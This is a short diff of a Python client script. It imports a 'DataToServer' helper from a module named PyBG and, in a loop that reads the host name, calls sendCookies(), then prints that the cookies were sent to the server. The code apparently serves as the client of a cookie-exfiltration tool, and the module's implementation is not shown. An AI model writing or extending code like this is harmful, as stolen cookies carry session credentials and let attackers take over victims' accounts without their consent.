@@ -1,9 +1,9 @@
 #Client
 
-from Socket import *
 import socket
 import os
 import time
+from PyBG import DataToServer
 
 while True:
     hostname = socket.gethostname()
@@ -17,6 +17,7 @@ while True:
 
 
 try:
+    print("1")
     result = DataToServer.sendCookies()
     print("向服务器发送cookie成功,sent cookie success")
 except Exception:
